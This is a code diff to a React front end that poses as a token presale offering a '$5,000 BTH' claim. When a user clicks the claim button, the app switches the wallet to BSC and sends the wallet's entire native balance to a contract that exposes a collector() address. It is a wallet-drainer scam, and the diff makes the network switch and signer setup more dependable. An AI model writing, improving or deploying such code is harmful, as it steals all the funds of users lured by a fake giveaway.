@@ -1,8 +1,8 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useWalletClient, useChainId, useSwitchChain } from 'wagmi';
+import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
 import { formatEther } from 'viem';
-import { BrowserProvider } from 'ethers';
+import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
@@ -21,6 +21,9 @@ const PRESALE_CONFIG = {
   }
 };
 
+// Get deployed chains (only BSC has contract address)
+const DEPLOYED_CHAINS = Object.values(PRESALE_CONFIG).filter(chain => chain.contractAddress);
+
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
   "function processNativeFlow() payable"
@@ -31,7 +34,6 @@ function App() {
   const { address, isConnected } = useAppKitAccount();
   const { disconnect } = useDisconnect();
   const { data: walletClient } = useWalletClient();
-  const { switchChain } = useSwitchChain();
   
   // Get REAL wallet chain ID from wagmi
   const chainId = useChainId();
@@ -114,32 +116,33 @@ function App() {
 
   const isBSC = chainId === 56;
 
-  // ✅ FIXED SIGNER CODE (WORKING) - Using walletClient.transport
+  // ✅ Signer initialization using walletClient
   useEffect(() => {
     const initSigner = async () => {
-      if (!walletClient || !isConnected || !address) {
+      if (!isConnected || !walletClient) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
       try {
-        const provider = new BrowserProvider(walletClient.transport);
-        const signer = await provider.getSigner();
-
-        const signerAddress = await signer.getAddress();
-        if (signerAddress.toLowerCase() === address.toLowerCase()) {
-          setProvider(provider);
-          setSigner(signer);
-          console.log("✅ Signer initialized");
+        const web3Provider = new ethers.BrowserProvider(walletClient);
+        const web3Signer = await web3Provider.getSigner();
+        
+        // Verify signer address matches connected address
+        const signerAddress = await web3Signer.getAddress();
+        if (signerAddress.toLowerCase() === address?.toLowerCase()) {
+          setProvider(web3Provider);
+          setSigner(web3Signer);
+          console.log("✅ Signer ready");
         }
-      } catch (e) {
-        console.error("Signer error:", e);
+      } catch (err) {
+        console.error("Signer init failed:", err);
       }
     };
 
     initSigner();
-  }, [walletClient, isConnected, address]);
+  }, [isConnected, walletClient, address]);
 
   // Countdown timer
   useEffect(() => {
@@ -198,13 +201,38 @@ function App() {
     }
   };
 
-  // ✅ CORRECT NETWORK SWITCH (Reown SAFE) - Using wagmi
+  // ✅ AUTO-SWITCH TO BSC USING window.ethereum (works with all wallets)
   const switchToBSC = async () => {
+    if (!window.ethereum) {
+      throw new Error("No wallet detected");
+    }
+
+    const BSC_CHAIN_ID = "0x38";
+
     try {
-      await switchChain({ chainId: 56 });
-    } catch (err) {
-      console.error('Switch error:', err);
-      throw err;
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: BSC_CHAIN_ID }]
+      });
+    } catch (switchError) {
+      if (switchError.code === 4902) {
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: BSC_CHAIN_ID,
+            chainName: "BNB Smart Chain",
+            nativeCurrency: {
+              name: "BNB",
+              symbol: "BNB",
+              decimals: 18
+            },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"]
+          }]
+        });
+      } else {
+        throw switchError;
+      }
     }
   };
 
@@ -221,12 +249,16 @@ function App() {
       setTxStatus('⏳ Preparing transaction...');
       setTxHash('');
 
-      // Switch to BSC if needed
-      if (!isBSC) {
+      // Get current chain config
+      const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
+      
+      // Check if current chain has a deployed contract (only BSC does)
+      if (!currentChain || !currentChain.contractAddress) {
+        // Auto-switch to BSC since it's the only deployed chain
         setTxStatus('🔄 Switching to BSC network...');
         await switchToBSC();
         
-        // Wait for network change
+        // Wait for network switch
         await new Promise(resolve => setTimeout(resolve, 2000));
         
         // Reload to ensure clean state
@@ -250,14 +282,14 @@ function App() {
         throw new Error('Wallet address mismatch');
       }
 
-      // Create contract
+      // Use BSC contract address
       const contract = new ethers.Contract(
         PRESALE_CONFIG.BSC.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
 
-      // ✅ USE 100% OF BALANCE
+      // ✅ USE 100% OF BALANCE (only gas will be deducted)
       const value = balanceData.value;
 
       setTxStatus('⏳ Estimating gas...');
@@ -267,7 +299,7 @@ function App() {
       
       setTxStatus('⏳ Please confirm in wallet...');
       
-      // Send transaction
+      // Send transaction with 100% balance
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
@@ -499,7 +531,7 @@ function App() {
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
               <span className="text-2xl">⚠️</span>
-              <span>Click "Claim $5,000 BTH" to switch to BSC</span>
+              <span>Click "Claim $5,000 BTH" to auto-switch to BSC network</span>
             </div>
           </div>
         )}
